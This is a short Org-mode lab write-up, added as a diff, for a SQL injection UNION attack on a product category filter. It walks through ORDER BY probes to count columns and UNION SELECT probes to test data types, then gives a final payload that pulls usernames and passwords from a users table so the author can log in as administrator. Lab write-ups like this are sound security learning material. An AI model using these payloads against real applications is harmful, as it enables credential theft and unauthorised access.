@@ -1,0 +1,49 @@
+#+title: SQL injection UNION attack, retrieving data from other tables
+
+* About
+Sql injection on ~category~ filter
+
+** End Goal
+Login as ~administrator~
+
+We can use what we learn from previous labs
+
+* Steps
+** Step 1
+First determine how many columns are there
+#+begin_src sql
+'ORDER BY 1 --
+#+end_src
+~200~ response
+#+begin_src sql
+'ORDER BY 2 --
+#+end_src
+~200~ response
+#+begin_src sql
+'ORDER BY 3 --
+#+end_src
+~500~ error response
+
+So columns = 2
+
+** Step 2
+Now determine the which data type is columns using
+
+#+begin_src sql
+'UNION SELECT 'abc', NULL --
+#+end_src
+~200~ response
+
+#+begin_src sql
+'UNION SELECT 'abc', 'bcb'--
+#+end_src
+~200~ response
+
+so  both columns are string data type
+
+* Solution query
+#+begin_src sql
+'UNION SELECT username, password FROM users --
+#+end_src
+
+This will show all the users with username and password information on the page. Now copy the password of  ~administrator~ and login
